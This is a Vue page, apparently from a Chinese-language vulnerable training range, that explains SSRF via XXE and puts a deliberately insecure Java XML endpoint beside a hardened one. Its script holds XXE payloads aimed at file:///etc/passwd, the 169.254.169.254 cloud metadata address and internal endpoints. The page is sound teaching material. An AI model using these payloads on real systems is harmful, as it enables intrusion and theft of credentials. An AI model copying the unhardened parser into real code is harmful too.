<template>
  <div class="root-div">
    <div class="vuln-info">
      <div class="header-div">SSRF via XXE（XXE 触发的 SSRF）</div>
      <div class="body-div">
        <el-tabs v-model="activeName" @tab-click="handleClick">
          <el-tab-pane label="漏洞描述" name="first">
            <div class="vuln-detail">
              SSRF via XXE 指：攻击者通过 XML 外部实体（XXE）让服务端在解析 XML 时，去请求攻击者指定的内网或外网 URL，从而用 XXE 触发服务端请求伪造（SSRF）。<br/><br/>
              利用方式包括：<br/>
              1. <b>外部通用实体</b>：在 DTD 中声明 <code>&lt;!ENTITY xxe SYSTEM "http://..."/&gt;</code>，解析时解析器会以服务端身份请求该 URL，若应用将实体替换后的内容返回，攻击者可见响应（带外回显）。<br/>
              2. <b>外部参数实体</b>：<code>&lt;!ENTITY % dtd SYSTEM "http://.../evil.dtd"&gt; %dtd;</code>，解析器会加载外部 DTD（SSRF），DTD 中可再定义实体指向内网，实现二次请求。<br/>
              3. 常见目标：内网服务、云元数据（如 169.254.169.254）、本地文件（file://）。
            </div>
          </el-tab-pane>
          <el-tab-pane label="漏洞危害" name="second">
            <div class="vuln-detail">
              1. 内网探测与端口扫描：从外网无法直接访问的机器，可由存在漏洞的服务器代为请求<br/>
              2. 读取内网/本机敏感接口：如管理后台、云元数据（临时密钥等）<br/>
              3. 读取本地文件：若解析器支持 file://，可读服务器上的配置文件、密钥等<br/>
              4. 绕过访问控制：请求来自本机或内网，可能被内网策略信任
            </div>
          </el-tab-pane>
          <el-tab-pane label="安全编码" name="third">
            <div class="vuln-detail">
              【必须】禁用 DTD（最彻底）：设置 disallow-doctype-decl 为 true<br/>
              【必须】禁用外部实体：关闭 external-general-entities、external-parameter-entities、load-external-dtd<br/>
              【建议】使用更安全的数据格式（如 JSON）或对存在解析 XML 的服务做网络隔离、限制出网
            </div>
          </el-tab-pane>
          <el-tab-pane label="参考文章" name="fourth">
            <div class="vuln-detail">
              <a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing" target="_blank" style="text-decoration: underline;">OWASP XXE</a><br/>
              <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html" target="_blank" style="text-decoration: underline;">XML 安全防护速查表</a><br/>
              <a href="https://portswigger.net/web-security/xxe" target="_blank" style="text-decoration: underline;">PortSwigger XXE 教程</a>
            </div>
          </el-tab-pane>
        </el-tabs>
      </div>
    </div>
    <div class="code-demo">
      <el-row :gutter="20" class="grid-flex">
        <el-col :span="12">
          <div class="grid-content bg-purple">
            <el-row type="flex" justify="space-between" align="middle">
              漏洞代码 - 默认配置允许外部实体（SSRF）
              <el-button type="danger" round size="mini" @click="showVulnDialog">去测试</el-button>
            </el-row>
            <pre v-highlightjs><code class="java">/**
 * SSRF via XXE - 漏洞代码
 * 默认配置允许外部实体，SYSTEM "http://..." 会使服务端发起请求
 */
@PostMapping("/vuln")
public Result xxeSsrfVulnerable(@RequestBody String xmlContent) {
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    DocumentBuilder db = dbf.newDocumentBuilder();
    Document doc = db.parse(new InputSource(new StringReader(xmlContent)));
    String result = doc.getDocumentElement().getTextContent();
    return Result.success(result);  // SSRF 拉取的内容会回显
}</code></pre>
          </div>
        </el-col>
        <el-col :span="12">
          <div class="grid-content bg-purple">
            <el-row type="flex" justify="space-between" align="middle">
              安全代码 - 禁用 DTD 与外部实体
              <el-button type="success" round size="mini" @click="showSecDialog">去测试</el-button>
            </el-row>
            <pre v-highlightjs><code class="java">/**
 * SSRF via XXE - 安全代码
 * 禁用 DTD 与外部实体，含 SSRF 的 payload 将被拒绝
 */
@PostMapping("/sec")
public Result xxeSsrfSecure(@RequestBody String xmlContent) {
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
    dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
    DocumentBuilder db = dbf.newDocumentBuilder();
    Document doc = db.parse(new InputSource(new StringReader(xmlContent)));
    return Result.success(doc.getDocumentElement().getTextContent());
}</code></pre>
          </div>
        </el-col>
      </el-row>
    </div>

    <el-dialog title="SSRF via XXE 漏洞测试" :visible.sync="vulnDialogVisible" class="center-dialog" width="800px">
      <div style="text-align: left; color: red; font-style: italic;">
        说明：选择不同 payload 观察服务端是否按指定 URL 发起请求；解析结果中会回显 SSRF 拉取到的内容。本靶场后端地址：{{ baseUrl }}（若端口不同请手动修改 payload 中的 URL）。
      </div>
      <el-form class="demo-form-inline">
        <el-form-item label="选择 Payload">
          <el-select v-model="vulnForm.selectedPayload" placeholder="请选择" @change="updateVulnPayload" style="width: 100%">
            <el-option label="【正常】简单 XML（无外部实体）" value="normal" />
            <el-option label="【外部通用实体】内网/本机 - SYSTEM 请求 /actuator/health" value="general_internal" />
            <el-option label="【外部通用实体】云元数据 - SYSTEM 请求 169.254.169.254" value="general_cloud" />
            <el-option label="【外部通用实体】本地文件 - SYSTEM file:///etc/passwd" value="general_file" />
            <el-option label="【外部参数实体】加载外部 DTD - %dtd 请求靶场 DTD 接口" value="param_dtd" />
          </el-select>
        </el-form-item>
        <el-form-item label="XML 内容">
          <el-input v-model="vulnForm.xmlContent" type="textarea" :rows="10" placeholder="请输入 XML" />
        </el-form-item>
        <el-form-item>
          <el-button type="primary" @click="testVulnerable">提交测试</el-button>
        </el-form-item>
      </el-form>
      <div v-if="vulnForm.result" class="result-display">
        <h4>解析结果（SSRF 拉取的内容会出现在此处）：</h4>
        <div class="result-text">
          <pre>{{ vulnForm.result }}</pre>
        </div>
      </div>
    </el-dialog>

    <el-dialog title="SSRF via XXE 安全防护测试" :visible.sync="secDialogVisible" class="center-dialog" width="800px">
      <div style="text-align: left; color: green; font-style: italic;">
        说明：安全代码已禁用 DTD 与外部实体，含 SSRF 的 payload 应被拒绝；【正常】无 DTD 的 XML 应解析成功。
      </div>
      <el-form class="demo-form-inline">
        <el-form-item label="选择 Payload">
          <el-select v-model="secForm.selectedPayload" placeholder="请选择" @change="updateSecPayload" style="width: 100%">
            <el-option label="【正常】简单 XML（无 DTD）- 应成功" value="normal" />
            <el-option label="【攻击】外部通用实体 SSRF - 应被拦截" value="general_internal" />
          </el-select>
        </el-form-item>
        <el-form-item label="XML 内容">
          <el-input v-model="secForm.xmlContent" type="textarea" :rows="10" placeholder="请输入 XML" />
        </el-form-item>
        <el-form-item>
          <el-button type="primary" @click="testSecure">提交测试</el-button>
        </el-form-item>
      </el-form>
      <div v-if="secForm.result" class="result-display">
        <h4>解析结果：</h4>
        <div class="result-text">
          <pre>{{ secForm.result }}</pre>
        </div>
      </div>
    </el-dialog>
  </div>
</template>

<script>
import { xxeSsrfVulnerable, xxeSsrfSecure } from '@/api/xml'

export default {
  data() {
    const base = (process.env.VUE_APP_BASE_API || '').replace(/\/$/, '') || 'http://127.0.0.1:8080'
    return {
      activeName: 'first',
      baseUrl: base,
      vulnDialogVisible: false,
      secDialogVisible: false,
      vulnForm: {
        selectedPayload: '',
        xmlContent: '',
        result: ''
      },
      secForm: {
        selectedPayload: '',
        xmlContent: '',
        result: ''
      }
    }
  },
  methods: {
    handleClick() {},
    showVulnDialog() {
      this.vulnDialogVisible = true
      this.vulnForm.selectedPayload = ''
      this.vulnForm.xmlContent = ''
      this.vulnForm.result = ''
    },
    showSecDialog() {
      this.secDialogVisible = true
      this.secForm.selectedPayload = ''
      this.secForm.xmlContent = ''
      this.secForm.result = ''
    },
    updateVulnPayload() {
      const payloads = this.getPayloads()
      this.vulnForm.xmlContent = payloads[this.vulnForm.selectedPayload] || ''
    },
    updateSecPayload() {
      const payloads = this.getPayloads()
      this.secForm.xmlContent = payloads[this.secForm.selectedPayload] || ''
    },
    testVulnerable() {
      if (!this.vulnForm.xmlContent || !this.vulnForm.xmlContent.trim()) {
        this.$message.warning('请输入 XML 内容')
        return
      }
      xxeSsrfVulnerable(this.vulnForm.xmlContent)
        .then(res => {
          this.vulnForm.result = res.data
        })
        .catch(err => {
          this.vulnForm.result = '解析失败: ' + (err.msg || err.message || '未知错误')
        })
    },
    testSecure() {
      if (!this.secForm.xmlContent || !this.secForm.xmlContent.trim()) {
        this.$message.warning('请输入 XML 内容')
        return
      }
      xxeSsrfSecure(this.secForm.xmlContent)
        .then(res => {
          this.secForm.result = res.data
        })
        .catch(err => {
          this.secForm.result = '安全策略拦截或解析失败: ' + (err.msg || err.message || '未知错误')
        })
    },
    getPayloads() {
      const base = this.baseUrl
      return {
        normal: `<?xml version="1.0" encoding="UTF-8"?>
<root>
  <message>Hello, normal XML without external entities.</message>
</root>`,
        general_internal: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "` + base + `/actuator/health">
]>
<root><content>&xxe;</content></root>`,
        general_cloud: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><content>&xxe;</content></root>`,
        general_file: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><content>&xxe;</content></root>`,
        param_dtd: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % dtd SYSTEM "` + base + `/xml/xxe-ssrf/dtd">
  %dtd;
]>
<root><content>&xxe;</content></root>`
      }
    }
  }
}
</script>

<style scoped>
.vuln-info {
  border-radius: 10px;
  margin-left: 20px;
  margin-right: 20px;
  margin-bottom: 20px;
  margin-top: 10px;
}
.header-div {
  font-size: 24px;
  color: #409EFF;
  font-weight: bold;
  padding: 10px;
  border-bottom: 1px solid #ccc;
}
.body-div {
  padding: 10px;
  font-family: Arial, sans-serif;
  font-size: 14px;
}
.vuln-detail {
  background-color: #dce9f8;
  padding: 10px;
}
.code-demo {
  margin: 20px;
  border-top: 1px solid #ccc;
  padding-top: 20px;
}
pre code { font-size: 12px; }
.el-row { margin-bottom: 20px; }
.el-col { border-radius: 4px; }
.bg-purple { background: #d3dce6; }
.grid-content { border-radius: 4px; height: 100%; padding: 10px; }
.grid-flex { display: flex; align-items: stretch; }
.center-dialog { text-align: center; margin: 0 auto; }
.demo-form-inline { text-align: left; }
.result-display { margin-top: 20px; text-align: center; }
.result-display h4 { text-align: left; margin-bottom: 10px; }
.result-text {
  text-align: left;
  background-color: #f5f7fa;
  padding: 10px;
  border-radius: 4px;
  max-height: 300px;
  overflow: auto;
}
.result-text pre {
  margin: 0;
  white-space: pre-wrap;
  word-wrap: break-word;
  font-family: Consolas, Monaco, 'Andale Mono', monospace;
  font-size: 12px;
  line-height: 1.5;
}
</style>
